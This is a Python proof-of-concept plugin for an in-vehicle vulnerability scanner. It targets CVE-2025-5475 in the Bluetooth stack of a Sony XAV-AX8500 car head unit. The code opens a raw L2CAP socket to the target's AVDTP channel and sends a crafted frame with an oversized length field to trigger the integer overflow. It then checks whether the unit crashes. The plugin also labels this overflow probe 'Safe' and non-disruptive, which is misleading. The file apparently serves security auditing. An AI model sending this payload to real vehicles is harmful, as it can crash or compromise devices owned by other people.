#!/usr/bin/env python3
"""Active validation PoC for connected-vehicle vulnerability scanning."""
from __future__ import annotations

import socket
import struct
import subprocess

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin


def _check_bt_adapter() -> dict:
    """Check Bluetooth adapter availability using hcitool."""
    info = {"adapter_found": False, "adapter_name": "", "hcitool_available": False}
    try:
        r = subprocess.run(
            ["hcitool", "dev"], capture_output=True, text=True, timeout=5
        )
        info["hcitool_available"] = True
        for line in r.stdout.splitlines():
            line = line.strip()
            if line.startswith("hci"):
                parts = line.split()
                info["adapter_found"] = True
                info["adapter_name"] = parts[0]
                if len(parts) > 1:
                    info["adapter_mac"] = parts[1]
                break
    except FileNotFoundError:
        info["error"] = "hcitool not found"
    except subprocess.TimeoutExpired:
        info["error"] = "hcitool timeout"
    return info


def _bt_ping(mac: str) -> dict:
    """Ping BT device using l2ping."""
    result = {"reachable": False, "output": "", "error": ""}
    try:
        r = subprocess.run(
            ["l2ping", "-c", "3", "-t", "5", mac],
            capture_output=True, text=True, timeout=20,
        )
        result["reachable"] = r.returncode == 0
        result["output"] = (r.stdout + r.stderr).strip()[:500]
    except FileNotFoundError:
        result["error"] = "l2ping not found"
    except subprocess.TimeoutExpired:
        result["error"] = "l2ping timeout"
    except Exception as exc:
        result["error"] = str(exc)
    return result


def _send_l2cap_crafted(mac: str, psm: int, payload: bytes) -> dict:
    """Send a crafted L2CAP packet using raw BT socket (Linux only)."""
    result = {"sent": False, "error": ""}
    try:
        AF_BLUETOOTH = getattr(socket, "AF_BLUETOOTH", 31)
        BTPROTO_L2CAP = getattr(socket, "BTPROTO_L2CAP", 0)
        sock = socket.socket(AF_BLUETOOTH, socket.SOCK_SEQPACKET, BTPROTO_L2CAP)
        sock.settimeout(8.0)
        # sockaddr_l2: family(2) + psm(2) + bdaddr(6) + cid(2) + bdaddr_type(1)
        bdaddr_bytes = bytes(int(b, 16) for b in reversed(mac.split(":")))
        addr = struct.pack("<H H 6s H B", AF_BLUETOOTH, psm, bdaddr_bytes, 0, 0)
        sock.connect(addr)
        sock.sendall(payload)
        result["sent"] = True
        sock.close()
    except OSError as exc:
        result["error"] = str(exc)
    except Exception as exc:
        result["error"] = str(exc)
    return result


def _run_poc(plugin) -> dict:
    params = plugin.params or {}
    bt_mac = params.get("bluetooth_mac") or params.get("bt_mac", "")
    wireless_scan_text = params.get("wireless_scan_text", "")

    evidence = {
        "cve": "CVE-2025-5475",
        "target": bt_mac or "Sony XAV-AX8500 BT head unit",
        "technique": (
            "BT integer overflow RCE probe: send crafted AVDTP/A2DP frame with "
            "oversized length field to trigger integer overflow in Sony BT stack"
        ),
        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2025-5475",
    }

    adapter_info = _check_bt_adapter()
    evidence["bt_adapter"] = adapter_info

    if not adapter_info["adapter_found"]:
        evidence["note"] = "No Bluetooth adapter found; cannot perform active BT probe"
        return {"vulnerable": None, "evidence": evidence, "requires_manual_review": True}

    if not bt_mac:
        evidence["note"] = "bluetooth_mac parameter required for active probe"
        return {"vulnerable": None, "evidence": evidence, "requires_manual_review": True}

    ping_result = _bt_ping(bt_mac)
    evidence["bt_ping"] = ping_result

    if not ping_result["reachable"]:
        evidence["note"] = f"Target BT device {bt_mac} not reachable"
        return {"vulnerable": None, "evidence": evidence, "requires_manual_review": True}

    # Craft integer overflow: AVDTP header with payload_length set to max uint16 (0xFFFF)
    # but actual data much smaller → triggers overflow in length calculation
    overflow_payload = struct.pack(">BB H", 0x00, 0x01, 0xFFFF) + b"\x41" * 64
    l2cap_result = _send_l2cap_crafted(bt_mac, 0x0019, overflow_payload)  # PSM 0x19 = AVDTP
    evidence["l2cap_overflow_probe"] = l2cap_result

    if l2cap_result["sent"]:
        vulnerable = None
        evidence["note"] = (
            "Integer overflow probe frame delivered to BT stack. "
            "Check for crash/reset of Sony XAV-AX8500 unit to confirm CVE-2025-5475."
        )
    else:
        vulnerable = None
        evidence["note"] = f"L2CAP connection failed: {l2cap_result['error']}"

    return {
        "vulnerable": vulnerable,
        "evidence": evidence,
        "requires_manual_review": True,
    }


VULN = {
    "id": 22,
    "cve": "CVE-2025-5475",
    "year": 2025,
    "domain": "蓝牙/IVI",
    "vendor_product": "Sony XAV-AX8500",
    "component": "Bluetooth stack",
    "type": "Bluetooth整数溢出/RCE",
    "summary": "Bluetooth包处理整数溢出，配对恶意设备后可RCE。",
    "source_description": "Sony XAV-AX8500 Bluetooth Packet Handling Integer Overflow Remote Code Execution Vulnerability. This vulnerability allows network-adjacent attackers to execute arbitrary code on affected Sony XAV-AX8500 devices. An attacker must first obtain the ability to pair a malicious Bluetooth device with the target system in order to exploit this vulnerability.\n\nThe specific flaw exists within the handling of Bluetooth packets. The issue results from the lack of proper validation of user-supplied data, which can result in an integer overflow before writing to memory. An attacker can leverage this vulnerability to execute code in the context of the elysian-bt-service process. Was ZDI-CAN-26283.",
    "poc_status": "有ZDI公开技术公告；未见官方PoC代码",
    "research_value": "非常适合IVI蓝牙协议栈模糊测试与攻击链研究。",
    "source_url": "https://nvd.nist.gov/vuln/detail/CVE-2025-5475",
    "references": [
        "https://nvd.nist.gov/vuln/detail/CVE-2025-5475",
        "https://www.zerodayinitiative.com/advisories/ZDI-25-353/",
        "https://www.sony.com/electronics/support/mobile-cd-players-digital-media-players-xav-series/xav-ax8500/software/00344092",
        "https://cveawg.mitre.org/api/cve/CVE-2025-5475"
    ],
    "affected": [
        {
            "vendor": "Sony",
            "product": "XAV-AX8500",
            "versions": [
                {
                    "version": "2.00.01",
                    "status": "affected"
                }

            ]
        }
    ],
    "signature_tokens": [
        "CVE-2025-5475",
        "Sony",
        "XAV-AX8500",
        "Bluetooth",
        "stack",
        "RCE",
        "Packet",
        "Handling",
        "Integer",
        "Overflow",
        "Remote",
        "Code",
        "Execution",
        "Vulnerability",
        "vulnerability",
        "network-adjacent",
        "attackers",
        "execute",
        "arbitrary",
        "code",
        "devices",
        "must",
        "first",
        "obtain",
        "ability",
        "pair",
        "malicious"
    ]
}

# ── 硬件需求（HW_REQUIREMENTS） ────────────────────────────────────────
HW_REQUIREMENTS = {
    "hardware":   ['USB Bluetooth 适配器（Ubertooth One 推荐用于嗅探）', '或内置 HCI 的 Linux 主机'],
    "connection": 'HCI（/dev/hci0）或 USB（Ubertooth）',
    "tools":      ['BlueZ ≥ 5.48', 'Ubertooth 工具链', 'Wireshark + BT 插件'],
    "firmware":   'Ubertooth firmware 2020-12-R1（ubertooth-dfu）',
    "setup":      'ubertooth-util -v && hciconfig hci0 up',
}



try:
    import sys as _sys; _sys.path.insert(0, __import__('pathlib').Path(__file__).parent.parent.as_posix())
    from probe_utils import detection_confidence as _dc
    _PROBE_UTILS = True
except ImportError:
    def _dc(level, evidence, **kw): return {'detection_confidence': {'level': level, 'evidence': evidence}}
    _PROBE_UTILS = False

class Poc42CVE20255475RCEAuditPlugin(IVIVulnerabilityPlugin):
    meta_display_id = "POC-WIRELESS-042"
    meta_poc_name = 'CVE-2025-5475 RCE Active Validation'
    meta_cve_id = 'CVE-2025-5475'
    meta_severity = 'High'
    meta_protocol = 'bluetooth'
    meta_target_os = ['all']
    meta_required_params = ['wireless_scan_text']
    meta_profiles = ['bluetooth']
    meta_source_url = 'https://nvd.nist.gov/vuln/detail/CVE-2025-5475'
    meta_references       = ['https://nvd.nist.gov/vuln/detail/CVE-2025-5475']
    meta_attack_surface = '无线/外设接口'
    is_disruptive = False
    meta_destructive_level = "Safe"

    def check_prerequisites(self):
        return True

    def exploit(self):
        return run_active_validation(self, VULN, probe=_run_poc)

if __name__ == "__main__":
    import argparse, json

    _desc = VULN.get("summary", "42_Sony_XAV_AX8500_BT_Integer_Overflow_RCE_Audit") if "VULN" in dir() else "42_Sony_XAV_AX8500_BT_Integer_Overflow_RCE_Audit"
    parser = argparse.ArgumentParser(description=_desc)
    parser.add_argument("target_ip", nargs="?", default="127.0.0.1",
                        help="目标 IP 地址")
    parser.add_argument("--port",       default=80, type=int)
    parser.add_argument("--disruptive", action="store_true",
                        help="启用破坏性探针（需操作员授权）")
    args = parser.parse_args()

    _plugin = Poc42CVE20255475RCEAuditPlugin({
        "target_ip":        args.target_ip,
        "port":             args.port,
        "allow_disruptive": args.disruptive,
    })
    _result = _plugin.run_verify()
    print(json.dumps(_result, indent=2, ensure_ascii=False, default=str))
